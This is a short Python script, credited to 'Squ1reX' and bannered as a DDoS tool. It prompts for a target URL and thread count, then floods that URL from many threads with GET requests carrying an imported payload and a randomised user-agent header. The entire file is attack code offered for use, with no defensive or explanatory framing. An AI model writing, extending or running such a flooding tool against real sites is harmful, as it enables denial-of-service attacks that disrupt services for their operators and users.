#!/usr/bin/env python

import requests
from threading import Thread
from faker import Faker
import colorama 
from colorama import Fore
from datetime import datetime, timezone
from system import PAYLOAD
from ip_take import *
from ua_agents import *
import random 

fake = Faker()
ip_addr = fake.ipv4()

date = datetime.fromtimestamp(1576280665, timezone.utc)

version = str(f"Version: 1.0.1, date:{date}")

baner = """
 ▄▄▄██▀▀▀█    ██  ███▄ ▄███▓ ▄▄▄▄    ▒█████     ▓█████▄ ▓█████▄  ▒█████    ██████ 
   ▒██   ██  ▓██▒▓██▒▀█▀ ██▒▓█████▄ ▒██▒  ██▒   ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
   ░██  ▓██  ▒██░▓██    ▓██░▒██▒ ▄██▒██░  ██▒   ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
▓██▄██▓ ▓▓█  ░██░▒██    ▒██ ▒██░█▀  ▒██   ██░   ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
 ▓███▒  ▒▒█████▓ ▒██▒   ░██▒░▓█  ▀█▓░ ████▓▒░   ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
 ▒▓▒▒░  ░▒▓▒ ▒ ▒ ░ ▒░   ░  ░░▒▓███▀▒░ ▒░▒░▒░     ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
 ▒ ░▒░  ░░▒░ ░ ░ ░  ░      ░▒░▒   ░   ░ ▒ ▒░     ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
 ░ ░ ░   ░░░ ░ ░ ░      ░    ░    ░ ░ ░ ░ ▒      ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
 ░   ░     ░            ░    ░          ░ ░        ░       ░        ░ ░        ░  
                                  ░              ░       ░                        
                              by Squ1reX :}
"""
print(Fore.RESET + "\033c")
print('Date:', date)
print('Version:', version)
print(Fore.RED + baner + Fore.RESET)

url = input(Fore.GREEN + 'Enter Url: ' + Fore.RESET)
threads = int(input(Fore.MAGENTA + 'Enter Threads: ' + Fore.RESET))

headers = {'User-Agent': random.choice(UA_list)}

def ddos():
    for i in range(threads):
        try:
            response = requests.get(url=url, headers=headers, data=PAYLOAD)
        except Exception as e:
            print(f"Error: {e}")

container = 0

if __name__ == "__main__":
    for i in range(threads):
        th = Thread(target=ddos)
        th.start()
        container += 1
        print('Ddos...' + str(container))

